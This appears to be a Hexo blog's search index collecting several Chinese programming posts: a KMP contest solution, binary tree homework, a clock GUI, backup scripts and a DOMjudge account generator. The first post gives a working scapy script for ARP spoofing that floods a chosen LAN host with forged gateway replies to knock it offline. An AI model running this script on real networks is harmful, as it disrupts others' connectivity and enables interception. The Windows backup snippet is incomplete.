<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ARP攻击</title>
    <url>/post/b286d8f1/</url>
    <content><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>攻击者向局域网特定网络设备持续的发送ARP欺骗数据包，对该网络设备进行网关欺骗，使其认为网关为攻击者设备，如果攻击者不对被攻击者的网络请求进行处理的话，会造成被攻击者断网。</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>inet为一个列表，存储发起ARP攻击要使用的网卡，分别存储网卡名称和网卡MAC地址，net为当前选中网卡序号。<br>host为一个备注字典表，键，值分别对应MAC地址和备注。<br><a id="more"></a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">inet = [</span><br><span class="line">    [<span class="string">&quot;Intel(R) Dual Band Wireless-AC 3165&quot;</span>, <span class="string">&quot;7C:67:A2:F1:9D:2A&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;802.11n USB Wireless LAN Card&quot;</span>, <span class="string">&quot;70:F1:1C:04:8A:54&quot;</span>]</span><br><span class="line">]</span><br><span class="line">host = &#123;</span><br><span class="line">    <span class="string">&quot;60:14:b3:ad:85:7d&quot;</span>: <span class="string">&quot;LiuQI&#x27;s PC-eth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;50:a0:09:d1:fb:65&quot;</span>: <span class="string">&quot;MiAi Sound Box&quot;</span>,</span><br><span class="line">    <span class="string">&quot;04:4f:4c:8e:dc:b8&quot;</span>: <span class="string">&quot;LiuQi&#x27;s Honor 9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;f4:30:b9:a6:0f:76&quot;</span>: <span class="string">&quot;Unkown&quot;</span>,</span><br><span class="line">    <span class="string">&quot;54:e1:ad:7c:0b:53&quot;</span>: <span class="string">&quot;ZhiHao&#x27;s PC-eth&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">net = <span class="number">0</span></span><br><span class="line">wifi = inet[net][<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> os.popen(<span class="string">&#x27;route print&#x27;</span>):</span><br><span class="line">    s = line.strip()</span><br><span class="line">    <span class="keyword">if</span> s.startswith(<span class="string">&#x27;0.0.0.0&#x27;</span>):</span><br><span class="line">        slist = s.split()</span><br><span class="line">        ip = slist[<span class="number">3</span>]</span><br><span class="line">        gw = slist[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">&#x27;GW：&#x27;</span>, gw)</span><br><span class="line">print(<span class="string">&#x27;IP：&#x27;</span>, ip)</span><br><span class="line">tnet = gw + <span class="string">&#x27;/24&#x27;</span></span><br><span class="line">p = Ether(dst=<span class="string">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span>) / ARP(pdst=tnet)</span><br><span class="line">ans, unans = srp(p, iface=wifi, timeout=<span class="number">5</span>, verbose=<span class="number">0</span>)</span><br><span class="line">print(<span class="string">&quot;Total %d Host：&quot;</span> % len(ans))</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> s, r <span class="keyword">in</span> ans:</span><br><span class="line">    result.append([r[ARP].psrc, r[ARP].hwsrc])</span><br><span class="line">result.sort()</span><br><span class="line"><span class="keyword">for</span> index, (ip, mac) <span class="keyword">in</span> enumerate(result):</span><br><span class="line">    print(index + <span class="number">1</span>, <span class="string">&quot;: &quot;</span>, ip, <span class="string">&quot;\t----&gt;\t&quot;</span>, mac, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> host.get(mac) == <span class="literal">None</span>:</span><br><span class="line">        print(<span class="string">&quot; ......&quot;</span>, host[mac])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print()</span><br><span class="line">target = int(input(<span class="string">&quot;Target：&quot;</span>)) - <span class="number">1</span></span><br><span class="line">target = result[target][<span class="number">0</span>]</span><br><span class="line">p1 = Ether(dst=<span class="string">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span>, src=inet[net][<span class="number">1</span>]) / ARP(pdst=target, psrc=gw)</span><br><span class="line">print(<span class="string">&quot;Processing......&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sendp(p1, verbose=<span class="number">0</span>)</span><br><span class="line">    time.sleep(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>ARP</tag>
      </tags>
  </entry>
  <entry>
    <title>A Secret</title>
    <url>/post/a56468f6/</url>
    <content><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><blockquote><p>Today is the birthday of SF,so VS gives two strings S1,S2 to SF as a present,which have a big secret.SF is interested in this secret and ask VS how to get it.There are the things that VS tell:<br>  Suffix(S2,i) = S2[i…len].Ni is the times that Suffix(S2,i) occurs in S1 and Li is the length of Suffix(S2,i).Then the secret is the sum of the product of Ni and Li.<br>  Now SF wants you to help him find the secret.The answer may be very large, so the answer should mod 1000000007.</p>
</blockquote>
<a id="more"></a>
<h1 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h1><blockquote><p>Input contains multiple cases.<br>  The first line contains an integer T,the number of cases.Then following T cases.<br>  Each test case contains two lines.The first line contains a string S1.The second line contains a string S2.<br>  1&lt;=T&lt;=10.1&lt;=|S1|,|S2|&lt;=1e6.S1 and S2 only consist of lowercase ,uppercase letter.</p>
</blockquote>
<h1 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h1><blockquote><p>For each test case,output a single line containing a integer,the answer of test case.<br>  The answer may be very large, so the answer should mod 1e9+7.</p>
</blockquote>
<h1 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2</span><br><span class="line">aaaaa</span><br><span class="line">aa</span><br><span class="line">abababab</span><br><span class="line">aba</span><br></pre></td></tr></table></figure>
<h1 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">13</span><br><span class="line">19</span><br></pre></td></tr></table></figure>
<h1 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case 2: </span><br><span class="line">Suffix(S2,1) &#x3D; &quot;aba&quot;,</span><br><span class="line">Suffix(S2,2) &#x3D; &quot;ba&quot;,</span><br><span class="line">Suffix(S2,3) &#x3D; &quot;a&quot;.</span><br><span class="line">N1 &#x3D; 3,</span><br><span class="line">N2 &#x3D; 3,</span><br><span class="line">N3 &#x3D; 4.</span><br><span class="line">L1 &#x3D; 3,</span><br><span class="line">L2 &#x3D; 2,</span><br><span class="line">L3 &#x3D; 1.</span><br><span class="line">ans &#x3D; （3*3+3*2+4*1）%1000000007.</span><br></pre></td></tr></table></figure>
<h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mod 1000000007</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> a,b;</span><br><span class="line"><span class="keyword">int</span> NEXT[<span class="number">1000020</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">-1</span>;</span><br><span class="line">    NEXT[i]=j;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;b.length())&#123;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">-1</span>||b[i]==b[j])</span><br><span class="line">        &#123;</span><br><span class="line">            i++;j++;</span><br><span class="line">            NEXT[i]=j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> j=NEXT[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kmp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    get();</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;a.length())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">-1</span>||a[i]==b[j])</span><br><span class="line">        &#123;</span><br><span class="line">            ans+=j+<span class="number">1</span>;</span><br><span class="line">            ans%=mod;</span><br><span class="line">            i++;j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">0</span>)i++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                j=NEXT[j];</span><br><span class="line">                ans+=<span class="number">1l</span>l*j*(j+<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">                ans%=mod;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="keyword">while</span>(T--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line">        reverse(a.begin(),a.end());</span><br><span class="line">        reverse(b.begin(),b.end());</span><br><span class="line">        a+=<span class="string">&#x27;X&#x27;</span>;b+=<span class="string">&#x27;Y&#x27;</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;kmp()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>KMP</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉树的遍历</title>
    <url>/post/ea4681d0/</url>
    <content><![CDATA[<h1 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br><a id="more"></a><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 20</span></span><br><span class="line"><span class="keyword">int</span> NodeSum=<span class="number">0</span>,LeafNode=<span class="number">0</span>,Rank=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span>&#123;</span>       <span class="comment">/*节点结构声明*/</span></span><br><span class="line">	<span class="keyword">char</span> data ;               <span class="comment">/*节点数据*/</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> *<span class="title">lchild</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> *<span class="title">rchild</span> ;</span>  <span class="comment">/*指针*/</span></span><br><span class="line">&#125;*BiTree;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createBiTree</span><span class="params">(BiTree *t)</span></span>&#123; <span class="comment">/* 先序遍历创建二叉树*/</span></span><br><span class="line">	<span class="keyword">char</span> s;</span><br><span class="line">	BiTree q;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nplease input data:(exit for #)&quot;</span>);</span><br><span class="line">	s=getchar();</span><br><span class="line">	<span class="keyword">if</span>(s==<span class="string">&#x27;#&#x27;</span>)&#123;*t=<span class="literal">NULL</span>; <span class="keyword">return</span>;&#125;</span><br><span class="line">	q=(BiTree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct BTNode));</span><br><span class="line">	<span class="keyword">if</span>(q==<span class="literal">NULL</span>)&#123;<span class="built_in">printf</span>(<span class="string">&quot;Memory alloc failure!&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>);&#125;</span><br><span class="line">	q-&gt;data=s;</span><br><span class="line">	*t=q;</span><br><span class="line">	createBiTree(&amp;q-&gt;lchild); <span class="comment">/*递归建立左子树*/</span></span><br><span class="line">	createBiTree(&amp;q-&gt;rchild); <span class="comment">/*递归建立右子树*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PreOrder</span><span class="params">(BiTree p)</span></span>&#123;  <span class="comment">/* 先序遍历二叉树*/</span></span><br><span class="line">    <span class="keyword">if</span> ( p!= <span class="literal">NULL</span> ) &#123;</span><br><span class="line">       	<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, p-&gt;data);</span><br><span class="line">		NodeSum++;</span><br><span class="line">       	PreOrder( p-&gt;lchild ) ;</span><br><span class="line">       	PreOrder( p-&gt;rchild) ;</span><br><span class="line">		<span class="keyword">if</span>(p-&gt;lchild==<span class="literal">NULL</span>&amp;&amp;p-&gt;rchild==<span class="literal">NULL</span>)</span><br><span class="line">			LeafNode++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetRank</span><span class="params">(BiTree p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (p==<span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> LRank=GetRank(p-&gt;lchild);</span><br><span class="line">		<span class="keyword">int</span> RRank=GetRank(p-&gt;rchild);</span><br><span class="line">		<span class="keyword">int</span> max=LRank;</span><br><span class="line">		<span class="keyword">if</span> (max&lt;RRank)</span><br><span class="line">			max=RRank;</span><br><span class="line">		<span class="keyword">return</span> max + <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrder</span><span class="params">(BiTree p)</span></span>&#123;  <span class="comment">/* 中序遍历二叉树*/</span></span><br><span class="line">    <span class="keyword">if</span>( p!= <span class="literal">NULL</span> ) &#123;</span><br><span class="line"> 	 InOrder( p-&gt;lchild ) ;</span><br><span class="line">   	 <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, p-&gt;data);</span><br><span class="line">   	 InOrder( p-&gt;rchild) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PostOrder</span><span class="params">(BiTree p)</span></span>&#123;  <span class="comment">/* 后序遍历二叉树*/</span></span><br><span class="line">   <span class="keyword">if</span> ( p!= <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    	PostOrder( p-&gt;lchild ) ;</span><br><span class="line">       	PostOrder( p-&gt;rchild) ;</span><br><span class="line">       	<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, p-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Preorder_n</span><span class="params">(BiTree p)</span></span>&#123; <span class="comment">/*先序遍历的非递归算法*/</span></span><br><span class="line">    BiTree <span class="built_in">stack</span>[MAX],q;</span><br><span class="line">    <span class="keyword">int</span> top=<span class="number">0</span>,i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;MAX;i++) <span class="built_in">stack</span>[i]=<span class="literal">NULL</span>;<span class="comment">/*初始化栈*/</span></span><br><span class="line">    q=p;</span><br><span class="line">    <span class="keyword">while</span>(q!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,q-&gt;data);</span><br><span class="line">        <span class="keyword">if</span>(q-&gt;rchild!=<span class="literal">NULL</span>) <span class="built_in">stack</span>[top++]=q-&gt;rchild;</span><br><span class="line">        <span class="keyword">if</span>(q-&gt;lchild!=<span class="literal">NULL</span>) q=q-&gt;lchild;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">if</span>(top&gt;<span class="number">0</span>) q=<span class="built_in">stack</span>[--top];</span><br><span class="line">            <span class="keyword">else</span> q=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">release</span><span class="params">(BiTree t)</span></span>&#123; <span class="comment">/*释放二叉树空间*/</span></span><br><span class="line">  	<span class="keyword">if</span>(t!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">    	release(t-&gt;lchild);</span><br><span class="line">    	release(t-&gt;rchild);</span><br><span class="line">    	<span class="built_in">free</span>(t);</span><br><span class="line">  	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    BiTree t=<span class="literal">NULL</span>;</span><br><span class="line">    createBiTree(&amp;t);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\nPreOrder the tree is:&quot;</span>);</span><br><span class="line">    PreOrder(t);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\nInOrder the tree is:&quot;</span>);</span><br><span class="line">    InOrder(t);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\nPostOrder the tree is:&quot;</span>);</span><br><span class="line">    PostOrder(t);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\nPreOrder(Not Recursive):&quot;</span>);</span><br><span class="line">    Preorder_n(t);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nThe Sum Of Node is %d\n&quot;</span>,NodeSum);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The Sum Of LeafNode is %d\n&quot;</span>,LeafNode);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The Height Of The Tree is %d\n&quot;</span>,GetRank(t));</span><br><span class="line">    release(t);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>树</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>Clock</title>
    <url>/post/7fba9196/</url>
    <content><![CDATA[<blockquote>
<p>C++编写的Clocl GUI</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;graphics.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> posx = <span class="number">240</span>, posy = <span class="number">240</span>, R = <span class="number">170</span>;</span><br><span class="line"><span class="keyword">char</span> str[<span class="number">24</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">point</span><span class="params">(<span class="keyword">int</span> r, <span class="keyword">int</span> rad, <span class="keyword">bool</span> xy)</span><span class="comment">//获取偏移点坐标</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">double</span> x = posx, y = posy;</span><br><span class="line">	<span class="keyword">if</span> (xy)<span class="keyword">return</span> (<span class="keyword">int</span>)(y - r * <span class="built_in">cos</span>(rad* PI / <span class="number">180</span>));</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">int</span>)(x + r * <span class="built_in">sin</span>(rad* PI / <span class="number">180</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span><span class="comment">//更新</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setbkcolor(EGERGB(<span class="number">30</span>, <span class="number">30</span>, <span class="number">30</span>));</span><br><span class="line">	setlinewidth(<span class="number">3</span>); setcolor(EGERGB(<span class="number">64</span>, <span class="number">0</span>, <span class="number">128</span>));</span><br><span class="line">	circle(posx, posy, R + <span class="number">16</span>); circle(posx, posy, R + <span class="number">14</span>); circle(posx, posy, R + <span class="number">12</span>); circle(posx, posy, R + <span class="number">10</span>);</span><br><span class="line">	setlinewidth(<span class="number">1</span>); setcolor(EGERGB(<span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>));</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">60</span>; i++)<span class="comment">//刻度</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (i % <span class="number">5</span>)line(point(R + <span class="number">2</span>, i * <span class="number">6</span>, <span class="number">0</span>), point(R + <span class="number">2</span>, i * <span class="number">6</span>, <span class="number">1</span>), point(R + <span class="number">9</span>, i * <span class="number">6</span>, <span class="number">0</span>), point(R + <span class="number">9</span>, i * <span class="number">6</span>, <span class="number">1</span>));</span><br><span class="line">		<span class="keyword">else</span> line(point(R - <span class="number">4</span>, i * <span class="number">6</span>, <span class="number">0</span>), point(R - <span class="number">4</span>, i * <span class="number">6</span>, <span class="number">1</span>), point(R + <span class="number">9</span>, i * <span class="number">6</span>, <span class="number">0</span>), point(R + <span class="number">9</span>, i * <span class="number">6</span>, <span class="number">1</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	setcolor(EGERGB(<span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>)); setfont(<span class="number">18</span>, <span class="number">0</span>, <span class="string">&quot;宋体&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">12</span>; i++)<span class="comment">//读数</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">sprintf</span>(str, <span class="string">&quot;%d&quot;</span>, i);</span><br><span class="line">		outtextrect(point(R - <span class="number">8</span>, i * <span class="number">30</span>, <span class="number">0</span>) - <span class="number">5</span>, point(R - <span class="number">8</span>, i * <span class="number">30</span>, <span class="number">1</span>) - <span class="number">5</span>, point(R - <span class="number">8</span>, i * <span class="number">30</span>, <span class="number">0</span>) + <span class="number">5</span>, point(R - <span class="number">8</span>, i * <span class="number">30</span>, <span class="number">1</span>) + <span class="number">5</span>, str);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">time_t</span> t_now; time(&amp;t_now); tm* t = localtime(&amp;t_now);<span class="comment">//获取系统时间</span></span><br><span class="line">	<span class="built_in">sprintf</span>(str, <span class="string">&quot;%04d/%02d/%02d %02d:%02d:%02d&quot;</span>, t-&gt;tm_year + <span class="number">1900</span>, t-&gt;tm_mon + <span class="number">1</span>, t-&gt;tm_mday, t-&gt;tm_hour, t-&gt;tm_min, t-&gt;tm_sec);</span><br><span class="line">	setlinewidth(<span class="number">8</span>); setcolor(BLUE);</span><br><span class="line">	line(posx, posy, point(R - <span class="number">80</span>, t-&gt;tm_hour % <span class="number">12</span> * <span class="number">30</span>, <span class="number">0</span>), point(R - <span class="number">80</span>, t-&gt;tm_hour % <span class="number">12</span> * <span class="number">30</span> + t-&gt;tm_min / <span class="number">12</span>, <span class="number">1</span>));<span class="comment">//时针</span></span><br><span class="line">	setlinewidth(<span class="number">4</span>); setcolor(RED);</span><br><span class="line">	line(posx, posy, point(R - <span class="number">40</span>, t-&gt;tm_min * <span class="number">6</span>, <span class="number">0</span>), point(R - <span class="number">40</span>, t-&gt;tm_min * <span class="number">6</span>, <span class="number">1</span>));<span class="comment">//分针</span></span><br><span class="line">	setlinewidth(<span class="number">2</span>); setcolor(YELLOW);</span><br><span class="line">	line(posx, posy, point(R - <span class="number">10</span>, t-&gt;tm_sec * <span class="number">6</span>, <span class="number">0</span>), point(R - <span class="number">10</span>, t-&gt;tm_sec * <span class="number">6</span>, <span class="number">1</span>));<span class="comment">//秒针</span></span><br><span class="line">	setfillcolor(YELLOW); fillellipse(posx, posy, <span class="number">5</span>, <span class="number">5</span>);</span><br><span class="line">	setcolor(GREEN); setfont(<span class="number">30</span>, <span class="number">0</span>, <span class="string">&quot;宋体&quot;</span>); outtextxy(<span class="number">95</span>, <span class="number">500</span>, str);<span class="comment">//数字时钟</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	initgraph(<span class="number">480</span>, <span class="number">640</span>);<span class="comment">//初始化画布</span></span><br><span class="line">	<span class="keyword">for</span> (; !kbhit(); delay_fps(<span class="number">60</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		cleardevice();<span class="comment">//清除画布</span></span><br><span class="line">		loop();<span class="comment">//更新</span></span><br><span class="line">	&#125;</span><br><span class="line">	closegraph();<span class="comment">//关闭画布</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程语言</category>
        <category>C++</category>
      </categories>
      <tags>
        <tag>GUI</tag>
      </tags>
  </entry>
  <entry>
    <title>批处理备份</title>
    <url>/post/2e9e806c/</url>
    <content><![CDATA[<h1 id="以当前时间备份文件"><a href="#以当前时间备份文件" class="headerlink" title="以当前时间备份文件"></a>以当前时间备份文件</h1><p><code>sample</code>是待备份文件夹</p>
<p>windows<br><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">if</span> &quot;<span class="variable">%time:~0,1%</span>&quot; <span class="keyword">EQU</span> &quot; &quot; (</span><br></pre></td></tr></table></figure></p>
<p>linux<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">time=$(date <span class="string">&#x27;+%Y%m%d%H%M%S&#x27;</span> )</span><br><span class="line">tar -cvf ./backup/<span class="variable">$time</span>.tar ./sample/</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>批处理</tag>
      </tags>
  </entry>
  <entry>
    <title>DOMjudge账号生成脚本</title>
    <url>/post/a25c27c8/</url>
    <content><![CDATA[<p>由于 <code>DOMjudge</code> 自带的添加队伍的不是很方便，所以还是自己写个python脚本生成 <code>csv</code> 导入数据库，配合 <code>phpmyadmin</code> 使用。<br><a id="more"></a></p>
<blockquote>
<p>$Vesion1.0$  个人赛账号生成脚本</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">import_team</span>(<span class="params">team_id, Users</span>):</span></span><br><span class="line">    team = open(<span class="string">&#x27;import_team.csv&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(Users)):</span><br><span class="line">        team.writelines(<span class="string">&#x27;&quot;%d&quot;,&quot;%d&quot;,&quot;%s&quot;,&quot;3&quot;,&quot;1&quot;,&quot;1&quot;,&quot;%s&quot;,NULL,NULL,NULL,&quot;0&quot;\n&#x27;</span></span><br><span class="line">                        % (team_id + i, i + <span class="number">1</span>, Users[i], Users[i]))</span><br><span class="line">    team.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">import_user</span>(<span class="params">user_id, team_id, Users</span>):</span></span><br><span class="line">    user = open(<span class="string">&#x27;import_user.csv&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(Users)):</span><br><span class="line">        user.writelines(<span class="string">&#x27;&quot;%d&quot;,&quot;user%02d&quot;,&quot;%s&quot;,NULL,NULL,NULL,NULL,NULL,NULL,&quot;1&quot;,&quot;%d&quot;\n&#x27;</span></span><br><span class="line">                        % (user_id + i, i + <span class="number">1</span>, Users[i], i 